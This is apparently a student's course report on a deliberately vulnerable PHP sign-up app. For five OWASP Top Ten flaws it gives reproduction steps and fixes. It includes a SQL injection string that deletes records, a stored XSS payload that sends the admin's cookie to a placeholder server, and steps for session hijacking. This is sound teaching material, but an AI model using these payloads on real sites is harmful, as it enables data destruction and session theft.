# The Report

This project is done with PHP in a LAMP environment.<br> 
See https://github.com/j0ly/firstproject/blob/master/README.md for installation instructions.

There are also other problems with this code, besides these which I have mentioned and provided a fix for here below. And I know, regarding the fixes, that there are many things that could be done to further improve the security. But I had to draw the line somewhere. The task was to have at least 5 OWASP Top Ten vulnerabilies, and to provide a fix for them, which I think I have done!

The OWASP vulnerabilities:

## A1-Injection

### How to identify 
Sign up some users to the event. Check from the Admin page. Then go to the Cancel page and enter: ```' OR '1'='1```. All the sign-ups are now gone, as you can see from the Admin page!    

### How to fix
Add this after line 12 in delete.php;

```$_ticket = mysqli_real_escape_string($conn, $ticket);```

And rename the $ticket variable two lines below to $_ticket. 

## A2-Broken Authentication and Session Management
The cookie-session-id is sent over an unencrypted connection.

### How to identify
You can get access to the Admin page using the stolen cookie-session-id like this (but before you begin, install the “Advanced Cookie Manager” Firefox add-on):

1. Capture the cookie-session-id with OWASP ZAP. 
2. Go to the Admin login-page with Firefox (but don’t log in, - if you are not asked for the credentials then close the browser and try again). 
3. Open “Advanced Cookie Manager” and enter the cookie-session-id you saw with OWASP ZAP into the "Value" box, replacing the existing one (delete first, then paste). Save the change.
4. Re-enter the Admin page (do not only reload), and you’re in without entering credentials!

Note: You can use OWASP ZAP together with another browser to capture the cookie-session-id when logging in.

### How to fix
Use SSL for the website (see the link in Readme for details)! 

## A3-Cross-Site Scripting (XSS)
There is a Stored XSS vulnerability. The XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
### How to identify
Enter this code into the address field on the SignUp page;

```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```

When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”.<br> 
But you can also test with code like this, in any of the fields on the SignUp page; 
```<body onload=alert('hello')>```

### How to fix
HTML codes should be escaped using the htmlspecialchars or htmlentities PHP-functions + the input validated as tightly as possible (length, allowed characters, format etc.).

## A6-Sensitive Data Exposure
Credit card numbers are sent without SSL in cleartext with POST.

### How to identify
Capture the (imaginary) credit card numbers using OWASP ZAP.

### How to fix: 
Again, use SSL (see the link in Readme for details)! 

But there are many requirements when handling credit card data, see https://en.wikipedia.org/wiki/Payment_Card_Industry_Data_Security_Standard<br>


## A7-Missing Function Level Access Control
The database credentials are stored in an easy to guess plaintext config file, inside the web-root, and is lacking access control.
### How to identify
Modify “yourserver” in this link to match your installation; http://yourserver/firstproject/admin/config.ini. Then open this link with your browser, and you should see the credentials.
### How to fix
Deny access to the config.ini file. 

There is already a .htaccess file in the admin folder that should do that, but Apache does not by default enable the use of .htaccess files. To enable, do this:

  Open /etc/apache2/apache2.conf in an editor, and find these lines;
  ```
  <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
  </Directory>
  ```
  Change “AllowOverride None” to “AllowOverride All”. Run the command “apachectl restart”, and try to open the link again.
